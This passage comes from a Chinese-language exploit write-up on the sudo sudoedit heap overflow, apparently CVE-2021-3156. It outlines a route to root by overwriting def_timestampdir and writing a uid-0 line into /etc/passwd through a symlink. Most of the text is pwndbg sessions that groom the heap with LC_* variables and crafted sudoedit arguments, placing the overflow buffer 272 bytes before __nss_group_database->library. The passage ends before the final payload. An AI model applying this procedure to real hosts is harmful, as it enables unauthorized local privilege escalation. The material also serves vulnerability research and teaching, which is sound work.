     420     /* Open time stamp file. */
     421     if (asprintf(&fname, "%s/%s", def_timestampdir, user) == -1) {
     422     sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
     ...
     608 /*
     609  * Lock a record in the time stamp file for exclusive access.
     610  * If the record does not exist, it is created (as disabled).
     611  */
     612 bool
     613 timestamp_lock(void *vcookie, struct passwd *pw)
     614 {
     ...
     638     nread = read(cookie->fd, &entry, sizeof(entry));
     639     if (nread fd, cookie->fname, &entry, 0) == -1)
     649         debug_return_bool(false);
     650     } else {
     ...
在plugins/sudoers/timestamp.c 的421行我们不难发现，sudo默认session路径是“/run/sudo/ts” +
当前用户名，def_timestampdir的地址是一个堆地址（plugins/sudoers/defaults.c的584行不难发现，使用strdup初始化的def_timestampdir）。因此我们可以总结一下这个方案的利用思路：
  * 构造溢出内存重写def_timestampdir的值，修改成一个普通用户可写的目录，暂记为NDIR。
  * 启动其他进程在NDIR中创建一个名称为当前用户指向 /etc/passwd的软链接
  * 在同一块溢出内存中构造uid是0的当前用户配置（例如：test: x:0:0::/home/test:/usr/bin/sh）
  * 利用timestamp_lock的回写逻辑把新的配置写入到NDIR/test -> /etc/passwd，最终实现test的uid == 0
​ 这个漏洞利用方案有点像前几年的内核“脏牛”漏洞，都是通过越权修改文件，最终实现提权效果。根据 **Qualys**
团队的研究表明，timestamp_lock的小漏洞已经在2020.01的586b418a修复了，目前还没有backport到老的版本中。
## POC实战
​ 上诉的三类方案中我个人更喜欢第二个方案，有以下几个原因：
  * 不需要与alsr对抗，有些操作系统不允许读取crash日志，获取alsr基地址比较困难。
  * 个人更喜欢缓存攻击的攻击方案（以前工作中写过一些内核POC，经常会利用slab/slub机制。缓存设计的本意是提升效率的，结果引发了新的安全问题，感兴趣的同学可以详细学习一下。）
  * 第三个方案依赖其他漏洞，前提条件太多，针对性太强。
综上几个原因，让我们开始第二个方案的实战吧。
我们已经知道sudo的运行内存会受到LC_*的环境变量影响我们先清空一下环境变量看一下sudo的运行内存情况：
    # env -i HOME=/root PATH=/usr/bin/ gdb --args /tmp/sudo/bin/sudoedit -A -s xxxxxx\\ xxxxxxxxxxxxx
set_cmnd执行前的内存情况：
    pwndbg> heapbase
    heapbase : 0x55790ab92000
    pwndbg> heapinfo
                      top: 0x55790aba6a50 (size : 0xc5b0) 
           last_remainder: 0x55790ab9eba0 (size : 0xf00) 
                unsortbin: 0x55790ab9eba0 (size : 0xf00)
             largebin[48]: 0x55790aba3bd0 (size : 0x2d20)
             largebin[50]: 0x55790ab9faf0 (size : 0x4010)
    (0x20)   tcache_entry[0](1): 0x55790ab9e390
    (0x40)   tcache_entry[2](3): 0x55790ab941d0 --> 0x55790ab96c30 --> 0x55790ab96920
    (0x70)   tcache_entry[5](1): 0x55790ab93480
    (0x80)   tcache_entry[6](1): 0x55790aba3b60
    (0x100)   tcache_entry[14](1): 0x55790ab97f10
    (0x150)   tcache_entry[19](1): 0x55790ab96ae0
    (0x180)   tcache_entry[22](1): 0x55790ab96960
    (0x1e0)   tcache_entry[28](1): 0x55790ab9e8c0
set_cmnd执行后nss_load_library初始化__nss_group_database前的的内存情况：
    pwndbg> heapinfo
                      top: 0x55790aba6a50 (size : 0xc5b0) 
           last_remainder: 0x55790ab9ec40 (size : 0xe60) 
                unsortbin: 0x55790ab9ec40 (size : 0xe60)
             largebin[48]: 0x55790aba3bd0 (size : 0x2d20)
             largebin[50]: 0x55790ab9faf0 (size : 0x4010)
    (0x40)   tcache_entry[2](3): 0x55790ab941d0 --> 0x55790ab96c30 --> 0x55790ab96920
    (0x70)   tcache_entry[5](1): 0x55790ab93480
    (0x80)   tcache_entry[6](1): 0x55790aba3b60
    (0x100)   tcache_entry[14](1): 0x55790ab97f10
    (0x150)   tcache_entry[19](1): 0x55790ab96ae0
    (0x180)   tcache_entry[22](1): 0x55790ab96960
    (0x1e0)   tcache_entry[28](1): 0x55790ab9e8c0
nss_load_library初始化__nss_group_database和sudo_user.cmnd_args后的内存i情况：
    pwndbg> heapinfo
                      top: 0x55790aba6a50 (size : 0xc5b0) 
           last_remainder: 0x55790ab9ec80 (size : 0xe20) 
                unsortbin: 0x55790ab9ec80 (size : 0xe20)
             largebin[48]: 0x55790aba3bd0 (size : 0x2d20)
             largebin[50]: 0x55790ab9faf0 (size : 0x4010)
    (0x40)   tcache_entry[2](3): 0x55790ab941d0 --> 0x55790ab96c30 --> 0x55790ab96920
    (0x70)   tcache_entry[5](1): 0x55790ab93480
    (0x80)   tcache_entry[6](1): 0x55790aba3b60
    (0x100)   tcache_entry[14](1): 0x55790ab97f10
    (0x150)   tcache_entry[19](1): 0x55790ab96ae0
    (0x180)   tcache_entry[22](1): 0x55790ab96960
    (0x1e0)   tcache_entry[28](1): 0x55790ab9e8c0
    pwndbg> p __nss_group_database                                                                               $5 = (service_user *) 0x55790ab92cc0
    pwndbg> p sudo_user.cmnd_args                                                                                 $6 = 0x55790ab9e390 "xxxxxx"
    pwndbg> chunkptr __nss_group_database                                                                         ==================================
                Chunk info            
    ==================================
    Status :  Used 
    Freeable : True
    prev_size : 0x70756f7267                  
    size : 0x40                  
    prev_inused : 1                    
    is_mmap : 0                    
    non_mainarea : 0 
    pwndbg> chunkptr sudo_user.cmnd_args                                                                         ==================================
                Chunk info            
    ==================================
    Status :  Freed 
    Unlinkable : False (FD or BK is corruption)  
    Can't access memory
    prev_size : 0x0                  
    size : 0x20                  
    prev_inused : 1                    
    is_mmap : 0                    
    non_mainarea : 0                     
    fd : 0x7800787878787878                  
    bk : 0x7878787878787878
上述的内存情况我们可以得到以下结论：
  * sudo_user.cmnd_args的地址高于__nss_group_database的地址
  * tcache中也没有低于__nss_group_database的地址
  * __nss_group_database节点的大小是0x40。
  * sudo_user.cmnd_args节点的大小是0x20 。（因为已经溢出下一个chunk已经被破坏）
接下来我们构造一些内存碎片，给让他们的地址小于__nss_group_database
    pwndbg> set env LC_IDENTIFICATION=en_US.UTF-8@xxxxxxxxxxxxx
    pwndbg> heapbase
    heapbase : 0x56447517a000
    pwndbg> heapinfo
                      top: 0x564475190500 (size : 0xab00) 
           last_remainder: 0x564475188730 (size : 0xe20) 
                unsortbin: 0x564475188730 (size : 0xe20)
             largebin[48]: 0x56447518d680 (size : 0x2d20)
             largebin[50]: 0x5644751895a0 (size : 0x4010)
    (0x40)   tcache_entry[2](3): 0x56447517d7e0 --> 0x56447517d770 --> 0x56447517d460
    (0x70)   tcache_entry[5](1): 0x56447517cf80
    (0x80)   tcache_entry[6](1): 0x56447518d610
    (0x100)   tcache_entry[14](1): 0x5644751819c0
    (0x150)   tcache_entry[19](1): 0x56447517d620
    (0x180)   tcache_entry[22](1): 0x56447517d4a0
    (0x1e0)   tcache_entry[28](1): 0x564475188370
    pwndbg> p __nss_group_database                                                                               $1 = (service_user *) 0x56447517d8c0
    pwndbg> p sudo_user.cmnd_args                                                                                 $2 = 0x564475187e40 "xxxxxx"
    pwndbg> p (void*)__nss_group_database - 0x56447517d7e0                                                       $2 = (void *) 0xe0
此时我们发现，tcache_entry[2]、tcache_entry[19]、
tcache_entry[22]的内存碎片地址都小于__nss_passwd_database的地址。接下来我们调整输入参数，申请到这个碎片。
    pwndbg> b set_cmnd 
    Breakpoint 1 at 0x7f36d5c62fd0: file ./sudoers.c, line 922.
    pwndbg> r -s 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\'
    ...
    pwndbg> heapbase                                                                                             heapbase : 0x555f813c5000
    pwndbg> heapinfo
                      top: 0x555f813db500 (size : 0xab00) 
           last_remainder: 0x555f813d3650 (size : 0xf00) 
                unsortbin: 0x555f813d3650 (size : 0xf00)
             largebin[48]: 0x555f813d8680 (size : 0x2d20)
             largebin[50]: 0x555f813d45a0 (size : 0x4010)
    (0x20)   tcache_entry[0](1): 0x555f813d2e40
    (0x40)   tcache_entry[2](3): 0x555f813c87d0 --> 0x555f813c8770 --> 0x555f813c8460
    (0x70)   tcache_entry[5](1): 0x555f813c7f80
    (0x80)   tcache_entry[6](1): 0x555f813d8610
    (0x100)   tcache_entry[14](1): 0x555f813cc9c0
    (0x150)   tcache_entry[19](1): 0x555f813c8620
    (0x180)   tcache_entry[22](1): 0x555f813c84a0
    (0x1e0)   tcache_entry[28](1): 0x555f813d3370
    pwndbg> b ./sudoers.c:1014                                                                                   Breakpoint 2 at 0x7f053126319d: ./sudoers.c:1014. (2 locations)
    pwndbg> c
    ...
    pwndbg> heapinfo                                                      
                      top: 0x555f813db500 (size : 0xab00) 
           last_remainder: 0x555f813d36f0 (size : 0xe60) 
                unsortbin: 0x555f813d36f0 (size : 0xe60)
             largebin[48]: 0x555f813d8680 (size : 0x2d20)
             largebin[50]: 0x555f813d45a0 (size : 0x4010)
    (0x20)   tcache_entry[0](1): 0x555f813d2e40
    (0x40)   tcache_entry[2](2): 0x555f813c8770 --> 0x555f813c8460 // 0x555f813c87d0 已经被我们申请走了
    (0x70)   tcache_entry[5](1): 0x555f813c7f80
    (0x80)   tcache_entry[6](1): 0x555f813d8610
    (0x100)   tcache_entry[14](1): 0x555f813cc9c0
    (0x150)   tcache_entry[19](1): 0x555f813c8620
    (0x180)   tcache_entry[22](1): 0x555f813c84a0
    (0x1e0)   tcache_entry[28](1): 0x555f813d3370
    pwndbg> b nss_load_library                                                                                   Breakpoint 3 at 0x7f0531c8c4c0: file nsswitch.c, line 329.
    pwndbg> c
    ...
    pwndbg> p __nss_group_database 
    $1 = (service_user *) 0x555f813c88c0
    pwndbg> p sudo_user.cmnd_args                                                                                 $2 = 0x555f813c87d0 'x' 
    pwndbg> p (void*)__nss_group_database - (void*)sudo_user.cmnd_args      
    $38 = 240
    pwndbg> p (void*)&__nss_group_database->library - (void*)sudo_user.cmnd_args                                 
    $49 = 272